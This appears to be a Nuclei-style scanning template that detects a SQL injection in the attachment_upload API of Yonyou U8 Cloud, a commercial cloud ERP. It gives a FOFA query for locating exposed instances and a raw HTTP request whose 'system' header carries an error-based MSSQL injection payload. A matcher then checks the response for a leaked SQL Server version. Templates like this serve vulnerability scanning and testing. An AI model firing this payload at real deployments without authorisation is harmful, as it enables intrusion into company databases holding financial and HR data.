id: yonyou-u8-cloud-attachment_upload-sqli

info:
  name: "用友 U8 Cloud attachment_upload 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="用友-U8-Cloud"
        用友U8-Cloud是面向成长型及创新型企业提供的云端ERP系统，集成人财物客、产供销等业务模块，支持多组织协同与智能财务功能，并通过产业链智造平台实现企业资源互联。经分析发现，该系统attachment_upload接口在处理用户输入时未正确过滤特殊字符，导致攻击者可通过构造恶意SQL语句实现数据库层权限突破。
  tags: 用友U8

http:
- raw:
  - |
    GET /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
    Host: {{Hostname}}
    Accept-Charset: utf-8
    Accept-Encoding: gzip, deflate
    Connection: close
    system: -1' or 1=@@version--+
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'Microsoft SQL Server'
